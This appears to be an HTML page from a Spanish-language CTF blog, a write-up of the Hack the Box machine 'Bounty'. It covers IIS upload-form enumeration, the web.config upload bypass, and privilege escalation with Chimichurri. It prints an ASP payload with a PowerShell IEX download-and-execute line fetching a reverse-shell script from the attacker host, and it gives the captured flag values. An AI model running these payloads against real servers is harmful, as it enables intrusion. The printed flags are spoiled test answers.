@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <title>Hack the Box: Bounty</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width-device-width, initial-scale-1">
+
+    <!--  Import the webpage's stylesheet  -->
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=BioRhyme:wght@800&family=Space+Mono&display=swap"
+        rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We" crossorigin="anonymous">
+    <link href="../style.css" rel="stylesheet">
+</head>
+
+<body style="background-color: darkgrey;">
+    <headear>
+        <nav class="navbar navbar-expand-lg navbar-dark bg-dark justify-content-end">
+            <a class="navbar-brand" href="../index.html">
+                <img src="../img/Brand.jpg" width="30" height="30" alt="" class="rounded"></a>
+            <ul class="nav ">
+                <li class="nav-item active">
+                    <a class="nav-link" href="../index.html">Inicio</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../htb/index.html">HackTheBox</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../index.html">Acerca de</a>
+                </li>
+        </nav>
+        <div class="cover d-flex justify-content-end align-items-start flex-column p-5">
+            <h1>RC1991</h1>
+            <p>Writeups para CTF's</p>
+            <form action="../htb/index.html" method="get" id="Index"></form>
+            <button class="btn btn-dark" type="submit" form="Index" value="Submit">Hack the Box</button>
+        </div>
+    </headear>
+    <section class="redaccion">
+        <div class="container mt-5 mb-5" style="background-color: whitesmoke;">
+            <h1>Bounty</h1>
+            <hr>
+            <img class="rounded mx-auto d-block mb-3" src="img/bounty/bounty_cards.png">
+            <p>La maquina Bounty es un equipo Windows Server 2008 que permite cargar archivos maliciosos
+                ocacionando la ejecucion remota de comandos.</p>
+            <p>Informacion Basica</p>
+            <ul>
+                <li><b>OS: </b>Windows</li>
+                <li><b>IP: </b>10.10.10.93</li>
+            </ul>
+            <h3>Enumeracion</h3>
+            <hr>
+            <p>Al realizar un escaneo sobre el equipo se puede detectar un unico servicio en ejecucion sobre el puerto
+                80</p>
+            <img class="rounded d-block mb-3" src="img/bounty/bounty_scan.png">
+            <p>Inspeccionando el servicio HTTP observar una pagina web montada en un servidor IIS</p>
+            <div class="container border border-success mb-3" style="background-color: #fdf6e3;"><code>
+                <span>URL: http://10.10.10.93/</span>
+            </code></div>
+            <img class="rounded mx-auto d-block " src="img/bounty/bounty_web.png">
+            <br>
+            <p>Explorando el servicio web con el uso de gobuster podemos encontrar un subdirectorio llamado
+                transfer.aspx</p>
+            <div class="container border border-success mb-3" style="background-color: #fdf6e3;"><code>
+                <span>gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,asp,aspx,html,txt -o gobusterScan.txt -t 200</span>
+            </code></div>
+            <div class="cover cover-small" style="background-image:url(img/bounty/bounty_gobuster.png)"></div>
+            <br>
+            <p>Dentro del diretorio encontrado se identifica un formulario que permite la carga de archivos al servidor
+                remoto</p>
+            <div class="container border border-success mb-3" style="background-color: #fdf6e3;"><code>
+                <span>http://10.10.10.93/transfer.aspx</span></code>
+            </div><br>
+            <div class="cover cover-small" style="background-image:url(img/bounty/bounty_upload.png)"></div>
+            <h3>Explotacion</h3>
+            <hr>
+            <p>Con el uso de Burpsuite se realiza un fuzzing a las extenciones mas comunes de archivos para determiner
+                que tipo de archivos se permiten cargar,
+                Una vez terminado el escaneo se detectan que las extensiones validas son .jpg y .config
+            </p>
+            <div class="cover cover-small" style="background-image:url(img/bounty/bounty_burp.png)"></div>
+            <br>
+            <p>Ya determinadas las extenciones se procede a ejecutar la prueba de concepto
+                "rce-by-uploading-a-web-config"</p>
+            <hr>
+            <p>Datos Exploit:<br>
+                <td><b>Service Exploited: </b></td<td>Microsoft-IIS Upload Files</td><br>
+                <td><b>Vulnerability Type: </b></td>
+                <td>Remote Code Execution</td><br>
+                <td><b>Exploit POC: </b></td>
+                <td> https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/</td><br>
+                <td><b>Description: </b></td>
+                <td>By uploading a web.config I was able to bypass the blacklist, which blocks files with an executable
+                    extension (such as ‘.asp’ and ‘.aspx’).</td><br>
+            </p>
+            <hr>
+            <p>EL siguiente codigo ejecutara un comando a nivel sistema operativo</p>
+
+            <div class="container border border-success mb-3" style="background-color: #fdf6e3;"><code>
+                <samp>
+                    &lt;!–-
+                    &lt;% Response.write("-"&"->")
+                    Response.write("&lt;pre&gt;")
+                    Set wShell1 = CreateObject("WScript.Shell")
+                    Set cmd1 = wShell1.Exec("<b>cmd /c Powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18:8000/IP.ps1') </b>")
+                    output1 = cmd1.StdOut.Readall()
+                    set cmd1 = nothing: Set wShell1 = nothing
+                    Response.write(output1)
+                    Response.write("&lt;/pre&gt;&lt;!-"&"-") %>
+                    -–></samp></code></div>
+
+            <p>En el codigo se le indica que descargue un archivio llamado <b>IP.ps1</b> del servidor atacante el cual
+                se ejecutara generando una shell reversa</p>
+            <div class="container border border-success mb-3" style="background-color: #fdf6e3;"><code>
+                    <span>  
+                    cmd /c Powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18:8000/IP.ps1')
+                    </span></code></div>
+            <p>Antes de cargar el codigo malicioso se requiere tener activo el servicor web en el equipo atante con el
+                arcivo IP.ps1
+                que generar la conexion reversa.<br>
+                Al cargar el archivo "web.config" con el codigo malicioso se ejecuta el comando que realizara la
+                descarga del archivo "IP.ps1"
+            </p>
+            <div class="cover cover-small" style="background-image:url(img/bounty/bounty_upload_file.png)"></div>
+            <p>Servidor web atacante</p>
+            <div class="container border border-success mb-3" style="background-color: #fdf6e3;"><code>
+                    <span>python3 -m http.server</span></code></div>
+            <img class="rounded float-left mb-3" src="img/bounty/bounty_upload_ip.png">
+            <p>conexion obtenida</p>
+            <img class="rounded float-left mb-3" src="img/bounty/bounty_session_ip.png">
+            <h3>Escalacion de Privilegios</h3>
+            <hr>
+            <p>Una vez dentro del equipo se raliza una validaicon rapida del equipo a si como de los permisos del
+                usuario con el que se obtuvo
+                la conexion remota<br>Revision del sistema
+            </p>
+            <div class="container border border-success mb-3" style="background-color: #fdf6e3;"><code>
+                    <span>systeminfo</span></code></div>
+            <img class="rounded float-left mb-3" src="img/bounty/bounty_sys.png">
+            <p>Revision de permisos</p>
+            <div class="container border border-success mb-3" style="background-color: #fdf6e3;"><code>
+                        <span>whoami /priv</span></code></div>
+            <img class="rounded float-left mb-3" src="img/bounty/bounty_perm.png">
+            <p>Las revisiones basicas sobre el sistema operativo remoto muestran que el equipo no cuenta con parches
+                instalados y que se tiene
+                el privilegio "SeImpersonatePrivilege" activado ,este privilegio permite suplantar un cliente después de
+                la autenticación </p>
+            <p>Usando el exploit "ms10-059" tambien conocido como chimicurri podemos obtener abusar del privilegio
+                "SeImpersonatePrivilege"
+                y obtener una shell reversa al equipo atacante con privilegios de "NT Authority\System"
+            </p>
+            <div class="container border border-success mb-3" style="background-color: #fdf6e3;"><code>
+                        <span>C:\Windows\Temp\Chimichurri.exe 10.10.14.18 6666</span></code></div>
+            <img class="rounded float-left mb-3" src="img/bounty/bounty_admn.png">
+            <h3>Flags</h3>
+            <hr>
+            <p>User:</p>
+            <div class="container border border-success mb-3" style="background-color: #fdf6e3;"><code>
+                        <span>type merlin\Desktop\user.txt<br>
+                            e29ad89891462e0b09741e3082f44a2f</span></code></div>
+            <img class="rounded float-left mb-3" src="img/bounty/bounty_user.png">
+            <p>Administrador:</p>
+            <div class="container border border-success mb-3" style="background-color: #fdf6e3;"><code>
+                        <span>type Administrator\Desktop\root.txt<br>
+                            c837f7b699feef5475a0c079f9d4f5ea</span></code></div>
+            <img class="rounded float-left mb-3" src="img/bounty/bounty_root.png">
+        </div>
+    </section>
+</body>
